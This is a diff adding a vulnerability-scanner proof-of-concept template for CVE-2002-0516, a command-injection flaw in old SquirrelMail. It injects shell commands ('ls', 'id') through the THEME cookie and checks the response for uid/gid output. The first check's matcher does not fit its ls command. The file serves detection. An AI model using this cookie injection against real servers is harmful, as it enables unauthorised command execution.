@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "验证 SquirrelMail 1.2.5 及之前版本中 THEME Cookie 变量的远程命令执行漏洞。认证用户通过修改 Cookie 中的 THEME 变量注入任意命令。"
+id = "POC-AVE-2002-0323"
+name = "CVE-2002-0516 PoC"
+severity = "critical"
+tags = ["ave-2002-0323"]
+vuln_id = [
+    "CVE-2002-0516",
+    "AVE-2002-0323",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/src/redirect.php"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "SQMSESSID={{SessionID}}; SM_USER={{Username}}; SM_PASS={{Password}}; THEME=default;ls;#"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/src/redirect.php"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "SQMSESSID={{SessionID}}; SM_USER={{Username}}; SM_PASS={{Password}}; THEME=default;id;#"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
